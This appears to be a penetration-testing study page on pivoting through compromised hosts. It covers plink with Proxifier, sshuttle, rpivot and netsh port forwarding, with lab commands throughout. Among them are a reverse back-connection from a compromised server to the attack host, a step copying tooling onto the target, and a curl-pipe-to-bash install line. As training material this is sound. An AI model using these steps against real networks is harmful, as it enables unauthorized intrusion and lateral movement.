# Pivoting Around Obstacles

## 1.SSH for Windows: plink.exe

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FaLhncOIJkoxDf0DJMCiJ%2Fimage.png?alt=media&amp;token=48d56289-1ed3-4f66-90c8-b899ab0f215d" alt=""><figcaption></figcaption></figure>

> The Windows attack host starts a plink.exe process with the below command-line arguments to start a dynamic port forward over the Ubuntu server. This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.

### Using Plink.exe

```cmd-session
plink -ssh -D 9050 ubuntu@10.129.15.50
```

### Proxifier

> Another Windows-based tool called [Proxifier](https://www.proxifier.com/) can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FyymLJWHhKF36CEm2vbpn%2Fimage.png?alt=media&amp;token=1f6249b6-722a-4e76-99f9-976100f76180" alt=""><figcaption></figcaption></figure>

After configuring the SOCKS server for `127.0.0.1` and port 9050, we can directly start `mstsc.exe` to start an RDP session with a Windows target that allows RDP connections.

***

## 2.SSH Pivoting with Sshuttle

### Installing sshuttle

```shell-session
sudo apt-get install sshuttle
```

> To use sshuttle, we specify the option `-r` to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.

### Running sshuttle

```shell-session
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```

> With this command, sshuttle creates an entry in our `iptables` to redirect all traffic to the 172.16.5.0/23 network through the pivot host.

### Traffic Routing through iptables Routes

```shell-session
sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn
```

> We can now use any tool directly without using proxychains

***

## 3.Web Server Pivoting with Rpivot

> [Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (`172.16.5.135`), and we want to access that using the rpivot proxy.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FcIBGEzFMv51CxQEOfVuL%2Fimage.png?alt=media&amp;token=335a8b77-b6ac-459d-8a40-9440d36344c7" alt=""><figcaption></figcaption></figure>

We can start our rpivot SOCKS proxy server using the below command to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections.

### Cloning rpivot

```shell-session
git clone https://github.com/klsecservices/rpivot.git
```

### Installing Python2.7

```shell-session
sudo apt-get install python2.7
```

### Alternative Installation of Python2.7

```shell-session
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
```

We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using `server.py`.

### **Running server.py from the Attack Host**

```shell-session
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Before running `client.py` we will need to transfer rpivot to the target. We can do this using this SCP command:

### **Transferring rpivot to the Target**

```shell-session
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

### Running client.py from Pivot Target

```shell-session
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```

### Confirming Connection is Established

```shell-session
New connection from host 10.129.202.64, source port 35226
```

### Browsing to the Target Webserver using Proxychains

```shell-session
proxychains firefox-esr 172.16.5.135:80
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FwlffanQ4gDljUI12YwIF%2Fimage.png?alt=media&amp;token=e3120203-1a63-4376-ab4a-a0ec0742ace8" alt=""><figcaption></figcaption></figure>

> Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have [HTTP-proxy with NTLM authentication](https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a) configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:

### Connecting to a Web Server using HTTP-Proxy & NTLM Auth

```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

***

## 4.Port Forwarding with Windows Netsh

[Netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use `Netsh` for:

* `Finding routes`
* `Viewing the firewall configuration`
* `Adding proxies`
* `Creating port forwarding rules`

Let's take an example of the below scenario where our compromised host is a Windows 10-based IT admin's workstation (`10.129.15.150`, `172.16.5.25`). Keep in mind that it is possible on an engagement that we may gain access to an employee's workstation through methods such as social engineering and phishing. This would allow us to pivot further from within the network the workstation is in.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FhyuWmL0iVanhAmBWlMTd%2Fimage.png?alt=media&amp;token=48726d88-6091-4290-9e10-4ef457c8fc0d" alt=""><figcaption></figcaption></figure>

> We can use `netsh.exe` to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.

### Using Netsh.exe to Port Forward

```cmd-session
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

### Verifying Port Forward

```cmd-session
C:\Windows\system32> netsh.exe interface portproxy show v4tov4
```

> After configuring the `portproxy` on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.

### **Connecting to the Internal Host through the Port Forward**

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FqgAIThuQtCtYjF5gp3EV%2Fimage.png?alt=media&amp;token=040bbc7e-15dd-4cef-9a81-13fed29fdc0b" alt=""><figcaption></figcaption></figure>
